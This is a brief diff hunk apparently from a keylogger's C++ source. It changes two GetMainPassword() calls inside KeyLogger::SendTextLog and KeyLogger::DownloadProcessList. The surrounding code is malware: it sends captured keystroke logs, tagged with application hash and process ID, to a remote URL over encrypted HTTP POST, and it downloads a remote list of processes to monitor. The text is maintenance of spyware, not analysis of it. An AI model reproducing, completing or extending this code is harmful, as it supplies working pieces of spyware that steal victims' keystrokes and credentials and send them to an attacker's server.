@@ -2894,7 +2894,7 @@ bool KeyLogger::SendTextLog(PCHAR URL, DWORD AppHash, DWORD Pid, PCHAR Log,
     ClearStruct(Response);
 
 	#ifdef CryptHTTPH
-		PCHAR Password = GetMainPassword(false);
+		PCHAR Password = GetMainPassword();
 
 		Result = CryptHTTP::Post(URL, Password, Fields, NULL, &Response, false);
 
@@ -2967,7 +2967,7 @@ bool KeyLogger::DownloadProcessList(bool *NotSupportKeylogger)
     PCHAR Buf = NULL;
 
 	#ifdef CryptHTTPH
-		PCHAR Password = GetMainPassword(false);
+		PCHAR Password = GetMainPassword();
 
 		Result = CryptHTTP::Post(URL, Password, Fields, &Buf, &Response, false);
 
